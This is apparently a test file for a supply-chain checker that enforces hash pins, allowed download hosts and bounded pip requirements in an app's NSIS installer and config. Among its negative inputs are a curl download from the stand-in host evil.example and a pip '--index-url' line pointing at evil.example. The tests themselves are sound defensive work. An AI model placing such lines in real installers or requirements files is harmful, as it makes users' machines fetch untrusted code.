import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { checkConfigText, checkNsi, checkRequirements } from "./check-installer-pins.mjs";

const HASH = "a".repeat(64);
const GOOD = (hash = HASH) => `
!define PYTHON_VERSION "3.12.7"
!define PYTHON_URL "https://www.python.org/ftp/python/\${PYTHON_VERSION}/python-\${PYTHON_VERSION}-amd64.exe"
!define PYTHON_SHA256 "${hash}"
NSISdl::download "https://go.microsoft.com/fwlink/p/?LinkId=2124703" "$TEMP\\x.exe"
; comment with http://example.com/ignored
`;
const REQ = "resources/server/requirements-installer.txt";
const NL = "\n";

test("a pinned template passes, in strict mode too", () => {
  const r = checkNsi(GOOD(), { strict: true });
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.warnings, []);
});

test("UNSET warns normally and fails in strict mode", () => {
  const dev = checkNsi(GOOD("UNSET"));
  assert.deepEqual(dev.errors, []);
  assert.equal(dev.warnings.length, 1);
  assert.match(checkNsi(GOOD("UNSET"), { strict: true }).errors.join(NL), /UNSET/);
});

test("a malformed hash fails", () => {
  assert.match(checkNsi(GOOD("abc123")).errors.join(NL), /not 64 hex/);
});

test("a missing or duplicate pin define fails", () => {
  assert.match(checkNsi(GOOD().replace(/!define PYTHON_SHA256.*\n/, "")).errors.join(NL), /found 0/);
  assert.match(checkNsi(GOOD() + `!define PYTHON_SHA256 "${HASH}"\n`).errors.join(NL), /found 2/);
});

test("a download from a host that is not allowed fails", () => {
  const r = checkNsi(GOOD() + `nsExec::ExecToLog 'curl.exe -o x "https://evil.example/model.onnx"'\n`);
  assert.match(r.errors.join(NL), /evil\.example/);
});

test("the old unpinned model download cannot come back", () => {
  const r = checkNsi(GOOD() + `curl.exe -L "https://github.com/8b-is/kokoro-tiny/raw/main/models/0.onnx"\n`);
  assert.match(r.errors.join(NL), /moving branch/);
});

test("plain http and a wrong Python host fail", () => {
  assert.match(checkNsi(GOOD() + `curl.exe "http://www.python.org/x.exe"\n`).errors.join(NL), /plain http/);
  const wrong = GOOD().replace("https://www.python.org/", "https://mirror.example/");
  assert.match(checkNsi(wrong).errors.join(NL), /PYTHON_URL must be https:\/\/www\.python\.org/);
});

test("stale product text in the bundle config fails", () => {
  const ok = { bundle: { resources: [REQ], longDescription: "A voice assistant." } };
  assert.equal(checkConfigText(JSON.stringify(ok)).length, 0);
  const stale = { bundle: { resources: [REQ], longDescription: "bridges to a remote n8n/Ollama backend" } };
  assert.equal(checkConfigText(JSON.stringify(stale)).length, 2);
  assert.equal(checkConfigText("{").length, 1);
});

test("the requirements file must be bundled", () => {
  assert.match(checkConfigText(JSON.stringify({ bundle: { resources: [] } })).join(NL), /requirements-installer\.txt/);
});

test("an unqualified pip install in the template fails", () => {
  const bad = GOOD() + `ExecWait '"$PythonExe" -m pip install --quiet fastapi uvicorn' $1\n`;
  assert.match(checkNsi(bad).errors.join(NL), /pip install without -r/);
  const other = GOOD() + `ExecWait '"$PythonExe" -m pip install -r "$INSTDIR\\other.txt"' $1\n`;
  assert.match(checkNsi(other).errors.join(NL), /must name requirements-installer\.txt/);
  const good = GOOD() + `ExecWait '"$PythonExe" -m pip install --quiet -r "$INSTDIR\\resources\\server\\requirements-installer.txt"' $1\n`;
  assert.deepEqual(checkNsi(good).errors, []);
});

test("every requirement needs an upper bound or ==, and no options or URLs", () => {
  assert.deepEqual(checkRequirements("# c\nnumpy>=1.26,<3.0\nuvicorn[standard]>=0.30,<1.0\nfoo==1.2.3\n"), []);
  assert.match(checkRequirements("numpy>=1.26\n").join(NL), /no upper bound/);
  assert.match(checkRequirements("fastapi\n").join(NL), /no upper bound/);
  assert.match(checkRequirements("--index-url https://evil.example/simple\n").join(NL), /not allowed/);
  assert.match(checkRequirements("git+https://github.com/x/y\n").join(NL), /not allowed/);
  assert.match(checkRequirements("# only comments\n").join(NL), /no requirements/);
});

test("the real template, config and requirements pass today (non-strict)", () => {
  const root = fileURLToPath(new URL("..", import.meta.url));
  const nsi = readFileSync(`${root}/src-tauri/installer/nexus-installer.nsi`, "utf8");
  assert.deepEqual(checkNsi(nsi).errors, []);
  const conf = readFileSync(`${root}/src-tauri/tauri.conf.json`, "utf8");
  assert.deepEqual(checkConfigText(conf), []);
  const req = readFileSync(`${root}/src-tauri/resources/server/requirements-installer.txt`, "utf8");
  assert.deepEqual(checkRequirements(req), []);
});
